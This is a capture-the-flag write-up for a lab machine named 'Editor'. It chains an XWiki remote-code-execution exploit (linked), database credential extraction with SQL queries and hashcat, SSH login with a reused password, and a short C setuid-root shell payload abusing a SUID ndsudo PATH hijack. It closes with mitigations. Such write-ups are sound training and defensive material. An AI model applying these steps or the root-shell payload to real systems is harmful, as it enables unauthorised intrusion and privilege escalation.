---
title: "Editor"
summary: "From XWiki remote code execution to credential discovery and privilege escalation through a SUID binary."
pubDate: 2025-12-07
draft: false
difficulty: Not rated
lang: en
techniques: ["Service enumeration", "XWiki RCE", "Database enumeration", "SUID PATH hijacking"]
---

## Phase 1: Port Enumeration

During the initial reconnaissance phase, I performed a port scan using Nmap and identified the following active services on the server:

```zsh
# Nmap 7.94SVN scan initiated Tue Dec  2 19:20:58 2025 as: nmap -v -p- -T5 --max-rtt-timeout 1000ms -sV -Pn -n -oN port.discovery 10.10.11.80
Warning: 10.10.11.80 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.80
Host is up (0.047s latency).
Not shown: 63546 closed tcp ports (conn-refused), 1986 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  2 19:26:52 2025 -- 1 IP address (1 host up) scanned in 353.55 seconds
```

Port 8080 hosts an XWiki instance, which is accessible via a login panel.

<img src="/labs/editor/XWiki.png" alt="XWiki" width="1917" height="635" loading="lazy" decoding="async" />

Existe un panel de loggeo accesible.

<img src="/labs/editor/XWiki_login.png" alt="XWiki login" width="1906" height="462" loading="lazy" decoding="async" />

## Phase 2: Vulnerability Identification

I noticed that the `nginx` version (1.18.0) is outdated and potentially vulnerable to certain attacks. Additionally, by investigating the XWiki instance, I identified the version in use, which is susceptible to a remote code execution (RCE) vulnerability, as documented in [this resource](https://www.offsec.com/blog/cve-2025-24893/).

<img src="/labs/editor/XWiki_version.png" alt="XWiki Version" width="83" height="54" loading="lazy" decoding="async" />

I used the [exploit](https://github.com/gunzf0x/CVE-2025-24893) available for this vulnerability and successfully executed a reverse shell on the server.

<img src="/labs/editor/reverse_shell.png" alt="reverse shell" width="1594" height="317" loading="lazy" decoding="async" />

## Phase 3: Internal Enumeration and Credential Extraction

Once inside the system, I searched for XWiki configuration files and found the MySQL database access password.

<img src="/labs/editor/searching_conf_files.png" alt="searching conf files" width="801" height="399" loading="lazy" decoding="async" />

<img src="/labs/editor/sql_connection.png" alt="sql connection" width="791" height="536" loading="lazy" decoding="async" />

By analyzing the tables, I focused on `xwikiobjects`, which stores registered objects in the application, particularly those of the `XWiki.User` class.

<img src="/labs/editor/sql_tables.png" alt="sql tables" width="338" height="554" loading="lazy" decoding="async" />

By correlating user identifiers with the `xwikiproperties` table, I discovered a `password` property associated with the user `neal`. Finally, in the `xwikistrings` table, I obtained the password hash for this user.

```sql
SELECT XWO_ID, XWO_NAME FROM xwikiobjects
WHERE XWO_ID = '-5552625943482576562';
SELECT XWP_ID, XWP_NAME, XWP_CLASSTYPE FROM xwikiproperties
WHERE XWP_ID = '-5552625943482576562';
SELECT XWS_NAME, XWS_VALUE FROM xwikistrings
WHERE XWS_ID = '-5552625943482576562' AND XWS_NAME = 'password';
```

The relevant value was a salted SHA-512 password hash. The complete table schemas and unrelated profile fields are omitted here to keep the credential investigation readable.

I attempted to crack the hash using `hashcat`, but was unsuccessful with the available dictionaries.

```bash
# Prepare the recovered hash and salt in hashcat format, then test the dictionary.
hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt
```

The dictionary attack did not recover this password.

## Phase 4: SSH Access and Privilege Escalation

By reviewing the `/etc/passwd` file, I identified `oliver` as an unprivileged user. I used the previously obtained password to access the system via SSH as `oliver`.

```text
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

```bash
ssh oliver@10.10.11.80
```

Once inside, I found the first flag `user.txt`. To escalate privileges, I ran the [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master) script, which revealed the presence of a SUID binary named `ndsudo`. Upon investigation, I discovered that this binary is vulnerable to privilege escalation by manipulating the `PATH`.

I used the [exploit](https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC), which consists of executing a shell as root.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

I compiled the payload and transferred it to the server, successfully achieving privilege escalation.

<img src="/labs/editor/privilege_escalation.png" alt="privilege escalation" width="725" height="242" loading="lazy" decoding="async" />


## Conclusions and mitigations

The attack chain combined an exposed XWiki instance with remote code execution, credentials found in configuration files and an unsafe SUID helper. Updating XWiki, limiting access to service credentials and removing or updating the vulnerable `ndsudo` binary would interrupt this chain. The unsuccessful hash-cracking attempt also shows why testing alternative evidence matters during enumeration.
